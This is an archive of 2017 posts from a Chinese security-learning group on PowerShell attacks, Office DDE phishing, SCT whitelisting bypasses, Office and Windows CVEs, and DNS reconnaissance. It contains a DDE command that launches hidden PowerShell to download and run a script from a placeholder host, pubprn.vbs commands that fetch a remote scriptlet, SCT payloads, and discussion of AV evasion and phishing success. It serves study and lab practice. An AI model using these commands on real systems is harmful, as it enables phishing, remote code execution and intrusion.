当然关于晋级的学习路线，就是想办法搞懂框架里面每个ps脚本，完全看懂，搞明白为什么这样编写，那样你不是大神都难啊！


[60字节 - 无文件渗透测试实验 - n0tr00t](https://www.n0tr00t.com/2017/03/09/penetration-test-without-file.html)

这篇实验很不错


[http://www.4hou.com/technology/5962.html](http://www.4hou.com/technology/5962.html)

这篇介绍了一些功能

<img src="https://images.xiaomiquan.com/Fm5xgpU8CtkJdA1HGdpE2Lc8iZ4o?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:lUnN4kveeBAKsxpdmxom6PAP-Js=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/FoXVJry5A5tEbpiAolQu7NpF5Yku?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:2XNEHgmrZhTpLawfaPYTimGy0kg=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 太复杂看不太懂，问一下，60字节 - 无文件渗透测试实验 搭建环境没有源码，漏洞如何利用都不清楚如何实验。

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 你会用虚拟机不？先用虚拟机搭起那个拓扑图，这步可以做到吗？然后在一台web服务器上，放上nishang的脚本，那么就可以在你拿了webshell的那台机器上执行我上面贴的那条命令，就可以执行攻击脚本了。那一条还不懂，说出来，不要怕丑，一切以弄懂知识为主。

<img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 在一台虚拟机上多个系统如何多个ip？是使用vpn吗

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__: 虚拟机可以软件模拟出多个内网，方便做实验，以vmware为例，搞明白 编辑-虚拟网络编辑器里面的配置，同一个vmnet就是在同一个网络下。有什么再不懂的百度下

<img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 好的谢谢


...

---

<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ on 2017-09-26:

可以在获取指定进程内存中字符串密码的powershell脚本，原理是动态编译C#代码执行，指定进程用正则暴搜内存中的字符串。


[mimikittenz/Invoke-mimikittenz.ps1 at master · put...](https://github.com/putterpanda/mimikittenz/blob/master/Invoke-mimikittenz.ps1)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 咪咪系列😄


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-10-22:


__#科普#__

powershell攻击方式的学习

前几天office出了个漏洞，可以直接使用文档中的（DDE）协议来执行命令，该方法可以不适用宏就能执行系统命令，对钓鱼攻击帮助很大，因为现在很多网关型设备，例如防火墙、邮件网关的会过滤或者检测宏，利用DDE协议可以直接调用powershell执行反弹shell命令，网上有很多复现方法了，我就不在这里去详说了，仅贴一个在茄牛那里看到的技巧。

```
"c:\\Programs\\Microsoft\\office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://XXXXXXX/power.ps1');powershell -e $e # " "for security reasons"
```

这个技巧更具有迷惑性，会在弹出的对话框中显示的是调用MSWord.exe，这个是很容易让人中招的。
通过Empire这个powershell攻击神器生成payload，然后进行监听。这种钓鱼方式对一般用户成功率很大，并且AV暂时无法检测。

后来继续延伸学习powershell的攻击方式，我把弦哥之前在圈中发的赛门铁克关于powershell的研究paper仔细读了一遍，姿势确实长进不少，文档作者写的非常详细，因为我那初中水平的英语读来实在压力太大，只能一句句去翻译然后用中文写下来再看，这样效果很好[囧]，现在把我简单翻译过的文档分享给像我这样的小白，我仅翻译了其中攻击阶段(执行脚本、横向渗透、持久控制)、混淆两个主要是攻击技巧的段落。但是也花了我很多时间，主要英语太水。

看完后你会对powershell攻击方式有个很全面的了解。另外想说看英文资料真的感觉技术介绍全面很多。


__分享文件:__

[powershell 攻击中的应用.pdf](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/powershell%20%E6%94%BB%E5%87%BB%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8.pdf)


...

<img src="https://file.xiaomiquan.com/55/63/5563fa6232ef0292366eafe32d3885655e0633e38d449bdc9f4393ff593695e3.jpeg" width="25px"/> __Sunglassescat__: 看到你说一句一句写下来，我真为自己感到羞愧。。。我都机翻的[捂脸]

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/55/63/5563fa6232ef0292366eafe32d3885655e0633e38d449bdc9f4393ff593695e3.jpeg" width="25px"/> __Sunglassescat__: 别说了，太丢人[囧]

<img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__: 能贴一下这个技巧的出处链接吗

<img src="https://file.xiaomiquan.com/46/04/46044dcd330b5e4cb18e8f31dd2f3b3f2a953af94425bb53f714f59d497244ba.jpg" width="25px"/> __程序员－玄魂__: 原文链接？

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__: 这个技巧是在别的小秘圈看到的，我贴的那段代码加上DDEAUTO就是全部内容了，附件那个文档的原文在我们圈子，弦哥发的一篇主题里，赛门铁克关于powershell的研究，你找一下。

<img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 昨天分析nishang里脚本的时候看到了，但是自己单独拿出来用的时候-e参数那里会报错，是因为我远程下载的脚本事先还要进行编码吗？然后我把分号后面改成了 iex $e # " "for security reasons"才可以。如果是的话为什么不直接用后一种方式？另外关于这个利用DDE协议进行攻击，我在本机测试成功了，然后传给同学用又没反应了，不知道是不是因为word版本的问题，我自己的是2010版本的，他们的都是新的。关于这类攻击还有没有好的参考资料？加个扣友交流下？谢谢！

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__: 发私信给你了


...

---


## WSH Injection


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-05:


__#姿势#__

WSH 注入的一个实例：

[WSH Injection: A Case Study – Posts By SpecterOps Team Members](https://posts.specterops.io/wsh-injection-a-case-study-fd35f79d29dd)



这个之前我在本圈子里分享过（白名单 PubPrn.vbs 下载恶意执行），不过估计大多数人都不知道为什么，怎么用。

想知道“为什么”可以看这个实例解析。

至于怎么用，当你需要下载恶意代码动态执行时，PubPrn.vbs 的这个注入机制很棒。

<img src="https://images.xiaomiquan.com/FtKzsYYbF40V-9QvwxD8K6lzsd1j?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:f5zadn-LBMOuhri-YTWEFKMS1G4=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__: 很强大，文中提到的《Bypass Application Whitelisting Script Protections - Regsvr32.exe & COM Scriptlets (.sct files)》涉及的技巧也很溜，想看中文的旁友可以参考这个： 


[http://www.evil0x.com/posts/21268.html](http://www.evil0x.com/posts/21268.html)


...

---



## downloader


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:


__#姿势#__

给大家分享点具体渗透姿势，比如白名单下载恶意代码的一个技巧。

OPCDE 里看到的一个技巧：

```
cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs blah "script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
```


```
cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs blah "script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
```



简单说下：

第一个是英文的 Win10，第二个是中文的 Win10。test.sct 里的代码会弹个计算器。pubprn.vbs 是 Win 系统自带的，被签名过的。通过这种方式，可以 bypass 一些防御。pubprn.vbs 充当 downloader 角色。

中文，我自己实测的，据其他圈友测试 Win7/XP 都 OK。

test.sct代码如下：

```
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    remotable="true"
 >
</registration>

<script language="JScript">
<![CDATA[

  var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 
 
]]>
</script>

</scriptlet>
```


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:


__#姿势#__

  接上面那条 SCT 的白名单下载技巧，推上发现 @subTee  又扔出一个小技巧：

Hope your SCT detection is richer than looking for 
`<scriptlet><registration>`
Cause `<package><component>` works too 😀

代码在这：

[https://gist.github.com/subTee/7cec8af1ae9b9493731...](https://gist.github.com/subTee/7cec8af1ae9b9493731b8ec70e2cf034)



拷贝过来如下：

```
<?xml version="1.0"?>
<package>
  <comment>
    
  </comment>

  <component id="ABAPTest">
    <?component error="true" debug="true"?>

    <registration 
    progid="PoC"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >

    <script >
        <![CDATA[

            var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); 

        ]]>
    </script>
</registration>

  </component>
</package>
```

也真只有吃透 Win，才能 hack 出更多独特玩法啊。


---


## MS Office



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-13:


__#漏洞#__

最新的 Office 高级威胁攻击预警CVE-2017-8759)

还有这个，自己看吧...

今天漏洞大集中啊，今晚不用睡觉了。


[【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警 - 安全客 - 有思想的安全新媒体](http://m.bobao.360.cn/learning/detail/4411.html)



<img src="https://images.xiaomiquan.com/FrL3tYnCvYclyL-CYbwZkfiI-L_p?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:JLmf99jlgcli0qZWDoyhxoSzw4o=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/cc/98/cc984e93368c4fb374909e4f3a7d739363b817c3944f1e6c90b761d9703b9b5f.jpg" width="25px"/> __Sky Lotus__: 笔记本搞没电了。。

<img src="https://file.xiaomiquan.com/73/46/7346088fcbd428bef2055102b2eb708048b824a0e3a18a369d5c40ef3265e14c.jpg" width="25px"/> __TomW__: 公司内网电脑单纯的打补丁是否可行？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/73/46/7346088fcbd428bef2055102b2eb708048b824a0e3a18a369d5c40ef3265e14c.jpg" width="25px"/> __TomW__: 打补丁好啊 尽快打

<img src="https://file.xiaomiquan.com/74/5e/745edea4e49022b74099ca16e653b7177e9ea16ff8e52cc8b1a950dfb835406c.jpg" width="25px"/> __Tsinghua&MIT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 内网为何也要打补丁？虚机形式存在且完全不与互联网连接啊

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/74/5e/745edea4e49022b74099ca16e653b7177e9ea16ff8e52cc8b1a950dfb835406c.jpg" width="25px"/> __Tsinghua&MIT__: 如果你自信满满，没问题啊

<img src="https://file.xiaomiquan.com/1a/db/1adbf2af8762674318ce8f35cd5ccd83e520ad1436bb0acb2031848305e544e3.jpg" width="25px"/> __小峰__ replies to <img src="https://file.xiaomiquan.com/74/5e/745edea4e49022b74099ca16e653b7177e9ea16ff8e52cc8b1a950dfb835406c.jpg" width="25px"/> __Tsinghua&MIT__: 内网更重要，也就更危险。


...

---

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-10-27:

McAfee Labs分析最新的Office漏洞 CVE-2017-11826

[Analyzing Microsoft Office Zero-Day Exploit CVE-20...](https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-microsoft-office-zero-day-exploit-cve-2017-11826-memory-corruption-vulnerability)


---

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-10-27:

这几天dde攻击挺火的，在国内很少看到讨论，我自己学习了测试了下，整理了一个文章。


__分享文件:__

[Ms office DDE攻击与防御.pdf](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/Ms%20office%20DDE%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1.pdf)


...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 这个真的是杀伤力很大的

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 讨论的挺多的啊，我的问题就是。怎么改窗口提示文字，还要点两次确认，原文这个问题不知道我看没看懂，能让他不弹窗就美了。

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 微软暂时不修复这个，意思好像是影响不大。😂

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 提示只能改的迷惑点，弹出的窗口无法改变。

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 我用qq邮箱收件时图片和DDE变成了DAT附件，没法执行，用网易邮箱可以正常执行。问题是过程中要弹出三个对话框，如果用户习惯性地点否或者关闭，那么成功概率很低啊。

<img src="https://file.xiaomiquan.com/06/80/0680db16c9c7b01e0339fde36284b22a6883bda247cdabb58ed9c92235fa2f3c.jpg" width="25px"/> __英雄马__: 向三爷的势力低头！


...

---

<img src="https://file.xiaomiquan.com/db/ce/dbcedb702dd5c5492dd767b6ca4573feb85d7a33fbd03f687408f6462185c575.jpg" width="25px"/> __myh0st__ on 2017-11-23:


__#漏洞#__

 小伙伴做的关于CVE-2017-11882 的复现及防御，希望大家别拿来做违法的事情，作为学习只用。

[CVE-2017-11882复现及防御 - 信安之路](http://www.myh0st.cn/index.php/archives/329/)





...

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 自带有ps_shell这个模块吗？

<img src="https://file.xiaomiquan.com/db/ce/dbcedb702dd5c5492dd767b6ca4573feb85d7a33fbd03f687408f6462185c575.jpg" width="25px"/> __myh0st__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 试一下，看看呗

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/db/ce/dbcedb702dd5c5492dd767b6ca4573feb85d7a33fbd03f687408f6462185c575.jpg" width="25px"/> __myh0st__: 没有的，好像是哪个写的，我再问问。

<img src="https://file.xiaomiquan.com/175/24/752430e4f6766378034cccf675f79c0822fe3a4cf5cb393eda4fe93cc123b3ff.jpeg" width="25px"/> __Reds__: 好像是cmd5里的乱舞好流弊👍👍

<img src="https://file.xiaomiquan.com/db/ce/dbcedb702dd5c5492dd767b6ca4573feb85d7a33fbd03f687408f6462185c575.jpg" width="25px"/> __myh0st__ replies to <img src="https://file.xiaomiquan.com/175/24/752430e4f6766378034cccf675f79c0822fe3a4cf5cb393eda4fe93cc123b3ff.jpeg" width="25px"/> __Reds__: 我都不知道他的名字

<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: msf 中没有PS_shell 怎么办？

<img src="https://file.xiaomiquan.com/3a/1d/3a1dfafee22fabee58800a8d92e40cb97cae002fa0245156de52e427a2631344.jpg" width="25px"/> __Leo__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 用这个exploit/windows/misc/hta_server，效果一样的


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-26:


__#姿势#__

Office CVE-2017-11882 实战免杀

分享者@J  

进圈挺久了，很喜欢圈里的氛围，也想着能分享些东西，但奈何太菜😂。今天找到弦哥以前公众号推的免杀文章，就想着跟office11882结合起来，其实严格说起来，我这还属于弦哥那篇文章的实践。现在我也体会到一种影响是可以潜移默化的，并当我们需要的时候会适时出现。谢谢“灰袍技能”！


[Office CVE-2017-11882实战免杀](https://delcoding.github.io/2017/11/office-2017-11882-bypass/)

...

<img src="https://file.xiaomiquan.com/a0/16/a016a3391c653fd1ee1940e7c61dc1f8692a3742a6e33804b3221d27cf1b7f75.jpg" width="25px"/> __小黑__: 太喜欢这样的干货了，今天实验成功，而且免杀，win7 win10都成功了，就是win2003+office2003弹不了，还有就是生成的文档一修改添加东西保存后也弹不了，求解

<img src="https://file.xiaomiquan.com/66/c6/66c64143afd244155da8c28bd184ab791369eafba71c41ae563a359d178a82c5.jpg" width="25px"/> __J__ replies to <img src="https://file.xiaomiquan.com/a0/16/a016a3391c653fd1ee1940e7c61dc1f8692a3742a6e33804b3221d27cf1b7f75.jpg" width="25px"/> __小黑__: 如果是要插入模板的话，我倒是看过一个脚本，可以在已有的文档里注入代码，不过我没实践，链接：
[CVE-2017-11882钓鱼攻击 « 倾旋的博客](http://payloads.online/archivers/2017-11-22/1)


<img src="https://file.xiaomiquan.com/b6/4a/b64a313d21a50c71fa67bee596a343fd60aa66d5437d5ee537f28bcb3849b8ca.jpg" width="25px"/> __北风飘然__: 这个看起来360并不是因为11882的特征判断的  [疑问]


...

---

## Windows COM

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:


__#姿势#__

CVE-2017-0213 Windows COM 特权提升漏洞组件，实战测试 WIN10 1703 完美通过，下载地址：


[Exploits/CVE-2017-0213 at master · WindowsExploits...](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213)



演示视频：


[CVE-2017-0213-hackone的秒拍](http://m.miaopai.com/show/channel/dciBNvvRVHMhThOIlaqG9qogVpApkSJ3)



来自本圈@h4ck0ne  的实测及演示视频录制，提权神洞，推荐给大家。



...

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 如果目标是域内的一台server，通过这个在本地把域账号添加到管理员组也适用么？

<img src="https://file.xiaomiquan.com/74/dd/74dd868df857e0ffec8613ae99f0891f0e7088f3533e8bd16f9614477984d3f6.jpg" width="25px"/> __‍迷途の狼__ replies to <img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 不行


...

---


## Exchange

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-26:

> 匿名用户 提问：
内网中域控权限 Exchange服务器可控 如何在命令行获取所有邮箱列表及单个邮箱邮件打包 或按时间段打包


好吧，还是公开回复吧，你可以参考这个项目：


[GitHub - sensepost/ruler: A tool to abuse Exchange services](https://github.com/sensepost/ruler)



"Ruler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. The main aim is abuse the client-side Outlook features and gain a shell remotely."

通过 MAPI/HTTP 与 RPC/HTTP 协议。



...

<img src="https://file.xiaomiquan.com/89/da/89dac2fbbada82afb3c1152dd4f88d703c91d5f5cbd238debe3f749b98c36f68.jpg" width="25px"/> __Twi1ight__: 用powershell在exchange服务器上也可以直接导出pst文件，支持按时间段导出，这是官方自带的


...

---


## 边界设备安全



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-09:

> 匿名用户 提问：
你好，能不能分享一些关于边界设备安全的资料，例如路由器，防火墙这类设备的安全，以及如何基于这类设备进行渗透测试，谢谢


之前分享的知道创宇研发技能表里有列不少。渗透测试高姿势可以参考 NSA 方程式被泄露的那批防火墙 Exploits。



---



## 信息收集



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-28:


__#基础#__

面向基础篇之信息收集

分享来自@yudan  

概要：渗透测试的第一步为信息收集。信息收集分为两个方面，主动信息收集和被动信息收集，这次我们先讲被动信息收集

被动信息收集要注意一下几点：

1. 信息是公开渠道可获得的信息，例如网络上的信息，街边的小广告

2. 收集信息时不与系统产生直接交互（例如不对主机进行大量探测，不进行端口扫描）

3. 尽量避免留下一切痕迹

可收集的信息内容有：

+ ip地址段
+ 域名信息
+ 邮件地址
+ 文档图片
+ 公司地址
+ 公司组织架构
+ 联系电话
+ 人员姓名/职务
+ 目标系统的技术架构
+ 公开的商业信息

用途有：

+ 信息描述目标
+ 社会工程学等

接下来介绍一款获得ip地址的工具：nslookup(域名查询工具)。

在用nslookup之前，我们首先需要知道域名有哪些:

域名记录:

+ A（Adress）用来指定主机名（或域名）的对应的ip地址记录
+ C name：通常称别名指向，可以将注册的不同域名统统转到一个主域名上，CNAME别名记录与A记录不同的是可以是一个域名的描述而不一定是ip地址    
+ NS：（Name Server）是域名服务器记录，用来指定域名应该由哪个DNS服务器来进行解析
+ MX：邮件交换记录，他指向一个邮件服务器，用于电子邮件系统发邮件时根据收信人的地址后缀来定位邮件服务器
+ ptr（ip地址反向解析）：邮件交换记录
+ TXT记录：一般为某个主机名或域名设置的说明
+ URL:网址转发
+ FQDN：完全限定域名，与域名不同（eg:www.sina.com就是一个完全限定域名，只是域名的其中一种）

dns查询方式：递归查询（相关资料可以自己查，太啰嗦不赘述）

接下来是nslookup的使用方法：

1. 我们可以直接在命令行上输入nslookup，进入命令行提示符进行操作
    + 通过 server +ip地址（中间一定要有一个空格）选择你要的本地dns服务器
    + 通过 set type=a/ns/ptr/any(代表所有记录)
    + 接下来看图，图中是百度的示例。
2. 同样的，我们可以将第一种方法上的所有参数用一条命令写出来
```
nslookup -type=a baidu.com 114.114.114.114(指定你想用的本地dns服务器)
```

P.S.

一个域名可以解析成多个主机记录和多个cname，对应多个ip地址，对一个ip地址进行ptr查询的时候不一定返回一个相同的域名
    
使用不同的服务器解析相同的域名会有不同的ip地址，因为智能dns服务器会尽量将流量限定在本地网络，当进行域名查询的时候会返回最近的域名服务器的地址

<img src="https://images.xiaomiquan.com/FoXOKm9XO81g-qTG-L7YB3R4juZi?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:VdpLft4Myzk6c2JKw6hUfBYmvak=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/Fkn83Kq9msBwJrn804arEKfpaYQN?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:-I0LRfQgpTajMTtXydf-mD0kxnQ=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-09-05:

这是一篇关于端口扫描的科普，对于原理讲的挺细了推荐新手同学好好读读，去实践一下
[谈谈端口探测的经验与原理 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/articles/network/146087.html)


---

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ on 2017-09-06:


__#基础#__

被动信息收集之dns区域传输，dns爆破

上一篇介绍了域名信息以及相关的记录和nslookup,接下来介绍另一种信息收集的方法   接上一次的介绍，我说到了一个东西，叫dns查询方式，但是没有展开说，dns查询采用的是递归查询，怎么个递归法呢，我找了一个链接比较详细

 
[DNS递归查询新手入门了解 DNS,DNS递归查询 - 鸿网互联[68IDC.CN]](http://www.68idc.cn/help/opersys/windowsserver2003/2013041829024.html)



可能看了不懂，没关系，我们接下来通过一个工具进行了解，下面介绍工具:
 DIG

 dig命令和nslookup有很多相似的地方，但是dig比nslookup功能强大许多

一、

基本使用：

```
dig www.sina.com any(查找所有记录，不用加-type) @8.8.8.8(指定dns服务器)
```

基本参数：

```
+noall：不显示任何结果，一般配合其他参数使用。
+answer:只显示结果。
-x:反向解析 dig -x 192.168.1.1（反向查询：查询ptr记录）
```

配合使用：`dig +noall +answer .......（除了结果什么都不显示）`

二、利用dig查询并进行抓包

通过执行基本命令 ：

```                      
dig sina.com +trace
```

进行域名追踪并通过wireshark进行抓包，可以了解到dns递归查询是怎样查询的，并且通过抓包，可以发现是否有人对dns服务器进行劫持，把域名解析到恶意网站，具体要自己抓过才能才知道。一定要自己抓，不能偷懒！
    
贴一个网址详细一点：
[DNS信息收集-DIG - 含笑 - CSDN博客](http://blog.csdn.net/qq_33936481/article/details/51424577)

